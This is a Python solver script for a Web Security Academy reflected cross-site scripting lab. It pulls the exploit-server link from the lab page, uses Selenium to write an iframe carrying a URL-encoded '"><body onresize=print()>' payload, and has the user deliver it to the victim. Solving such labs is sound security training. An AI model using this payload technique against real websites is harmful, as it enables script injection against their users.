#!/usr/bin/env python3 

import requests
import urllib3
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from bs4 import BeautifulSoup
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Cross-Site Scripting (XSS) Web Security Academy

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "%22%3E%3Cbody%20onresize=print()%3E"

The command is: %22%3E%3Cbody%20onresize=print()%3E

The payload was initially: "><body onresize=print()>, and we have URL-encoded the symbols: ", >, < and space
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
parser.add_argument('-c', '--command', help='Command to run, Example: ', required=True)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
command = args.command

# get hostname of exploit server
def exp_hostname(url):
    r = requests.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    for a in soup.find_all('a', href=True):
        if ('exploit' in a['href']):
            global hostname
            hostname = a['href']
            return hostname

def write_body(command, hostname):
    driver = webdriver.Firefox()
    driver.get(hostname)
    textarea = driver.find_element(By.NAME, "responseBody")
    cmd = "<iframe src=\"" + url + "/" + "/?search=" + command + "\" onload=this.style.width='100px'>"
    textarea.send_keys(cmd)
    print("Press the <Store> button and then the <Deliver exploit to victim> button")

def main():
    
    print("(+) Exploiting Reflected XSS")

    exp_hostname(url)
    
    write_body(command, hostname)

if __name__ == "__main__":
    main()
